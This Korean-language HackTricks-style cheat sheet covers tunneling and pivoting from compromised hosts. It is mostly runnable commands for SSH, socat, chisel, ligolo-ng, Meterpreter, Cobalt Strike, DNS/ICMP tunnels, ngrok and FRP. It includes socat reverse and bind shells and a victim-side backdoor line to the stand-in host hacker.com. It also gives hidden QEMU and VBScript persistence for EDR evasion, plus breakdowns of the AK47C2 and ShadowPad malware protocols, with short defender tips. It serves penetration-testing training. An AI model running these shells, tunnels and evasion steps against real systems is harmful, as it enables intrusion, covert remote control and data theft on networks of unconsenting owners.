# 터널링 및 Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap 팁

> [!WARNING]
> **ICMP** 및 **SYN** scans는 socks proxies를 통해 tunnel할 수 없으므로, 이를 작동시키려면 **ping discovery** (`-Pn`)를 **disable**하고 **TCP scans** (`-sT`)를 지정해야 합니다.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH 그래픽 연결 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Server에서 새 Port 열기 --> Other port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

로컬 포트 --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

로컬 포트 --> Compromised host (SSH) --> 어디든지
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

내부 호스트에서 DMZ를 거쳐 자신의 호스트로 reverse shell을 가져오는 데 유용합니다:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

새 인터페이스를 생성할 것이므로 **두 장치 모두에서 root 권한**이 필요하며, sshd config에서 root 로그인을 허용해야 합니다:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Server 측에서 forwarding 활성화
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
클라이언트 측에서 새 route 설정
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> 2023년 Terrapin downgrade attack은 man-in-the-middle이 초기 SSH handshake를 변조하고 **any forwarded channel** ( `-L`, `-R`, `-D` )에 데이터를 주입할 수 있게 합니다. SSH tunnels에 의존하기 전에 client와 server 모두에 patch가 적용되었는지 (**OpenSSH ≥ 9.6/LibreSSH 6.7**) 확인하거나, `sshd_config`/`ssh_config`에서 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` algorithms를 명시적으로 disable하세요.

## SSHUTTLE

호스트를 통해 **ssh**로 **subnetwork**으로 향하는 모든 **traffic**을 **tunnel**할 수 있습니다.\
예를 들어 10.10.10.0/24로 향하는 모든 traffic을 forwarding하는 경우
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
개인 키로 연결
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

로컬 포트 --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
또 다른 방법:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

모든 interface에서 listening하며 **beacon을 통해 traffic을 route**하는 데 사용할 수 있는 port를 teamserver에서 엽니다.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 이 경우 **port는 beacon host에서 열리며**, traffic은 Team Server가 아니라 Team Server로 전송된 후, 그곳에서 지정된 host:port로 전달됩니다.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
참고:

- Beacon의 reverse port forward는 **개별 시스템 간 relay가 아니라 Team Server로 traffic을 tunnel하기 위한 목적으로 설계되었습니다**.
- Traffic은 P2P links를 포함하여 **Beacon의 C2 traffic 내부에서 tunnel됩니다**.
- high ports에서 reverse port forward를 생성하는 데 **Admin privileges는 필요하지 않습니다**.

### rPort2Port local

> [!WARNING]
> 이 경우 **port는 Team Server가 아니라 beacon host에서 열리며**, **traffic은 Team Server가 아닌 Cobalt Strike client로 전송되고**, 그곳에서 지정된 host:port로 전달됩니다.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

웹 파일 터널을 업로드해야 합니다: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 releases 페이지에서 다운로드할 수 있습니다.\
client와 server에는 **동일한 버전**을 사용해야 합니다.

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### 포트 포워딩
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**agent와 proxy에 동일한 버전을 사용하세요**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent 바인딩 및 Listening
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agent의 로컬 포트에 접근
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. The tunnel은 victim에서 시작됩니다.\
A socks4 proxy가 127.0.0.1:1080에 생성됩니다.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy**를 통한 Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks를 통한 Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat을 통한 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
피해자의 콘솔에서 마지막 줄 대신 다음 줄을 실행하여 **인증되지 않은 proxy**를 우회할 수 있습니다:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Client와 Server 양쪽에서 certificates를 생성합니다.
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

로컬 SSH 포트(22)를 attacker 호스트의 443 포트에 연결합니다.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

콘솔용 PuTTY 버전과 같으며, 옵션도 ssh client와 매우 유사합니다.

이 binary는 victim에서 실행되고 ssh client이므로, reverse connection을 설정할 수 있도록 우리의 ssh service와 port를 열어야 합니다. 그런 다음 로컬에서만 액세스할 수 있는 port를 우리 machine의 port로 forward하려면:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

로컬 관리자 권한이 필요합니다(모든 포트에 대해)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

**시스템에 대한 RDP access가 필요합니다.**\
Download:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 tool은 Windows의 Remote Desktop Service 기능에 포함된 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **RDP connection을 통해 packet을 tunneling**하는 역할을 합니다.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

client computer에서 다음과 같이 **`SocksOverRDP-Plugin.dll`**을 load합니다:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **victim**에 **connect**할 수 있으며, **SocksOverRDP plugin이 활성화되었다는** **prompt**가 표시되고 **127.0.0.1:1080**에서 **listen**합니다.

**RDP**를 통해 **connect**한 다음, victim machine에 `SocksOverRDP-Server.exe` binary를 upload하고 execute합니다:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
이제 머신(공격자)에서 포트 1080이 수신 대기 중인지 확인합니다:
```
netstat -antb | findstr 1080
```
이제 [**Proxifier**](https://www.proxifier.com/)를 사용하여 해당 포트를 통해 traffic을 proxy할 수 있습니다.

## Windows GUI Apps Proxify

[**Proxifier**](https://www.proxifier.com/)를 사용하여 Windows GUI apps가 proxy를 통해 탐색하도록 설정할 수 있습니다.\
**Profile -> Proxy Servers**에서 SOCKS server의 IP와 port를 추가합니다.\
**Profile -> Proxification Rules**에서 proxify할 program 이름과 proxify하려는 IP에 대한 connections를 추가합니다.

## NTLM proxy bypass

앞서 언급한 tool: **Rpivot**\
**OpenVPN**도 configuration file에 다음 options를 설정하면 이를 bypass할 수 있습니다:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

proxy에 대해 인증하고, 지정한 external service로 forward되는 port를 로컬에 bind합니다. 그런 다음 이 port를 통해 원하는 tool을 사용할 수 있습니다.\
예를 들어 port 443을 forward합니다.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
이제 예를 들어 victim에서 **SSH** service가 port 443에서 listen하도록 설정하면, attacker의 port 2222를 통해 연결할 수 있습니다.\
**meterpreter**가 localhost:443에 연결하고 attacker가 port 2222에서 listen하도록 설정할 수도 있습니다.

## YARP

Microsoft에서 만든 reverse proxy입니다. 다음에서 확인할 수 있습니다: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

두 system 모두에서 tun adapters를 생성하고 DNS queries를 사용하여 data를 tunnel하려면 Root 권한이 필요합니다.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
tunnel은 매우 느릴 것입니다. 다음을 사용하여 이 tunnel을 통해 압축된 SSH 연결을 생성할 수 있습니다:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**여기에서 다운로드**](https://github.com/iagox86/dnscat2)**.**

DNS를 통해 C\&C 채널을 설정합니다. root 권한이 필요하지 않습니다.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell에서**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)을 사용하여 PowerShell에서 dnscat2 client를 실행할 수 있습니다:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat을 사용한 Port forwarding**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS 변경

Proxychains는 `gethostbyname` libc 호출을 가로채고, socks proxy를 통해 tcp DNS 요청을 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** server는 **4.2.2.2**입니다(하드코딩됨). 변경하려면 다음 file을 편집하고 IP를 변경합니다: _/usr/lib/proxychains3/proxyresolv_. **Windows environment**에 있다면 **domain controller**의 IP를 설정할 수 있습니다.

## Go의 Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor는 corporate network에서 거의 차단되지 않는 두 protocol인 outbound **DNS** 및 **plain HTTP POST** traffic만 악용하는 **dual-channel C2 ("AK47C2")**를 생성했습니다.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• 임의의 5-character SessionID(예: `H4T14`)를 생성합니다.
• *task requests*에는 `1`, *results*에는 `2`를 앞에 붙이고, 여러 field(flags, SessionID, computer name)를 연결합니다.
• 각 field는 ASCII key `VHBD@H`로 **XOR-encrypted**된 후 hex-encoded되며, dots로 연결되고 마지막에는 attacker-controlled domain이 추가됩니다:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests는 **TXT**(및 fallback **MG**) records에 `DnsQuery()`를 사용합니다.
• Response가 0xFF bytes를 초과하면 backdoor는 data를 63-byte 조각으로 **fragments**하고 다음 marker를 삽입하여 C2 server가 순서를 복원할 수 있도록 합니다:
`s<SessionID>t<TOTAL>p<POS>`

2. **HTTP mode (AK47HTTP)**
• 다음 JSON envelope를 구성합니다:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 전체 blob은 XOR-`VHBD@H` → hex → header `Content-Type: text/plain`과 함께 **`POST /`**의 body로 전송됩니다.
• Reply도 동일한 encoding을 따르며, `cmd` field는 `cmd.exe /c <command> 2>&1`로 실행됩니다.

Blue Team notes
• 첫 번째 label이 긴 hexadecimal이고 항상 하나의 희귀한 domain으로 끝나는 비정상적인 **TXT queries**를 찾습니다.
• constant XOR key와 ASCII-hex 조합은 YARA로 쉽게 탐지할 수 있습니다: `6?56484244?484` (`VHBD@H`의 hex).
• HTTP의 경우 pure hex이며 2 bytes의 배수인 text/plain POST bodies를 flag합니다.

{{#note}}
전체 channel은 **standard RFC-compliant queries** 안에 들어가며 각 sub-domain label을 63 bytes 미만으로 유지하므로 대부분의 DNS logs에서 stealthy합니다.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

두 system 모두에서 tun adapter를 생성하고 ICMP echo requests를 사용해 둘 사이에 data를 tunnel하려면 root 권한이 필요합니다.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**여기에서 다운로드**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **은 한 줄의 명령어로 솔루션을 Internet에 노출할 수 있는 도구입니다.**\
_노출되는 URI는 다음과 같습니다:_ **UID.ngrok.io**

### 설치

- 계정 생성: https://ngrok.com/signup
- Client 다운로드:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 기본 사용법

**문서:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_필요한 경우 authentication 및 TLS를 추가할 수도 있습니다._

#### TCP 터널링
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP로 파일 노출
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP 호출 Sniffing

_XSS,SSRF,SSTI 등에 유용_\
stdout에서 직접 확인하거나 HTTP interface [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### 내부 HTTP service Tunneling
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 간단한 configuration 예시

3개의 tunnel을 엽니다:

- 2개의 TCP
- /tmp/httpbin/에서 static files를 제공하는 1개의 HTTP
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare의 `cloudflared` daemon은 Cloudflare의 edge를 rendez-vous 지점으로 사용하여, inbound firewall rules 없이 **local TCP/UDP services**를 노출하는 outbound tunnels을 생성할 수 있습니다. 이는 egress firewall이 HTTPS traffic만 허용하고 inbound connections가 차단된 경우 매우 유용합니다.

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS를 통한 지속적 tunnel
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
커넥터 시작:
```bash
cloudflared tunnel run mytunnel
```
모든 traffic이 **443을 통해 outbound로 host를 빠져나가기** 때문에 Cloudflared tunnels는 ingress ACLs 또는 NAT boundaries를 우회하는 간단한 방법입니다. binary는 일반적으로 elevated privileges로 실행된다는 점에 유의하세요. 가능한 경우 containers 또는 `--user` flag를 사용하세요.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp)는 **TCP, UDP, HTTP/S, SOCKS 및 P2P NAT-hole-punching**을 지원하는 actively-maintained Go reverse-proxy입니다. **v0.53.0 (May 2024)**부터는 **SSH Tunnel Gateway**로 동작할 수 있으므로, target host는 추가 binary 없이 stock OpenSSH client만 사용해 reverse tunnel을 생성할 수 있습니다.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 새로운 SSH gateway 사용하기 (frpc binary 없음)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
위 명령은 추가 도구를 배포하지 않고 victim의 **8080** 포트를 **attacker_ip:9000**으로 공개하므로, living-off-the-land pivoting에 이상적입니다.

## QEMU를 사용한 은밀한 VM 기반 Tunnel

QEMU의 user-mode networking(`-netdev user`)은 **호스트의 TCP/UDP 포트를 바인딩하고 이를 *guest*로 전달하는** `hostfwd`라는 옵션을 지원합니다. guest에서 완전한 SSH daemon을 실행하면, `hostfwd` 규칙을 통해 전적으로 임시 VM 내부에 존재하는 일회용 SSH jump box를 만들 수 있습니다. 이는 모든 malicious activity와 파일이 virtual disk에만 남기 때문에 EDR로부터 C2 traffic을 숨기는 데 적합합니다.<sup>[[1]](#references)</sup>

### 빠른 한 줄 명령
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 위 명령은 **Tiny Core Linux** 이미지(`tc.qcow2`)를 RAM에서 실행합니다.
• Windows host의 **2222/tcp** 포트는 guest 내부의 **22/tcp**로 투명하게 포워딩됩니다.
• attacker의 관점에서 target은 단순히 2222 포트를 노출합니다. 해당 포트에 도달하는 모든 패킷은 VM에서 실행 중인 SSH server가 처리합니다.

### VBScript를 통한 stealthy 실행
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs`로 스크립트를 실행하면 창이 계속 숨겨진 상태로 유지됩니다.

### 게스트 내부 persistence

Tiny Core는 stateless이므로, 공격자는 일반적으로 다음을 수행합니다.

1. payload를 `/opt/123.out`에 저장합니다.
2. `/opt/bootlocal.sh`에 다음을 추가합니다.

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `home/tc`와 `opt`를 `/opt/filetool.lst`에 추가하여, 시스템 종료 시 payload가 `mydata.tgz`에 패키징되도록 합니다.

### 이것이 탐지를 회피하는 이유

• 서명되지 않은 실행 파일 2개(`qemu-system-*.exe`)만 디스크에 접근하며, driver나 service는 설치되지 않습니다.
• 호스트의 보안 제품에는 **무해한 loopback traffic**만 표시됩니다(실제 C2는 VM 내부에서 종료됨).
• 악성 process space가 별도의 OS에 존재하므로 memory scanner는 이를 분석하지 못합니다.

### Defender 팁

• 사용자 쓰기 가능 경로에 있는 **예상치 못한 QEMU/VirtualBox/KVM binary**를 alert 대상으로 지정합니다.
• `qemu-system*.exe`에서 시작되는 outbound connection을 차단합니다.
• QEMU가 실행된 직후 binding되는 드물게 사용되는 listening port(2222, 10022, …)를 hunt합니다.

## `HttpAddUrl`을 통한 IIS/HTTP.sys relay node (ShadowPad)

Ink Dragon의 ShadowPad IIS module은 HTTP.sys layer에서 은밀한 URL prefix를 직접 binding하여, 침해된 모든 perimeter web server를 **backdoor + relay**의 dual-purpose node로 전환합니다:<sup>[[3]](#references)</sup>

* **Config defaults** – module의 JSON config에서 값이 누락되면 그럴듯한 IIS default(`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`)로 fallback합니다. 따라서 benign traffic은 올바른 branding을 사용하여 IIS가 응답합니다.
* **Wildcard interception** – operator는 URL prefix 목록을 세미콜론으로 구분하여 지정합니다(host와 path에 wildcard 사용). module은 각 entry에 대해 `HttpAddUrl`을 호출하므로, HTTP.sys는 matching request를 IIS module에 전달하기 *전에* malicious handler로 routing합니다.
* **Encrypted first packet** – request body의 처음 2바이트에는 custom 32-bit PRNG의 seed가 들어 있습니다. 이후 모든 byte는 protocol parsing 전에 생성된 keystream과 XOR됩니다.

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module은 두 개의 list를 유지합니다. 하나는 “servers”(upstream node)이고, 다른 하나는 “clients”(downstream implant)입니다. 약 30초 이내에 heartbeat가 도착하지 않으면 entry가 제거됩니다. 두 list가 모두 비어 있지 않으면 첫 번째 healthy server와 첫 번째 healthy client를 pairing하고, 한쪽이 connection을 close할 때까지 두 socket 사이에서 byte를 그대로 pipe합니다.
* **Debug telemetry** – optional logging은 각 pairing에 대해 source IP, destination IP 및 total forwarded byte를 기록합니다. investigator는 이 breadcrumb를 사용하여 여러 victim에 걸쳐 구축된 ShadowPad mesh를 재구성했습니다.

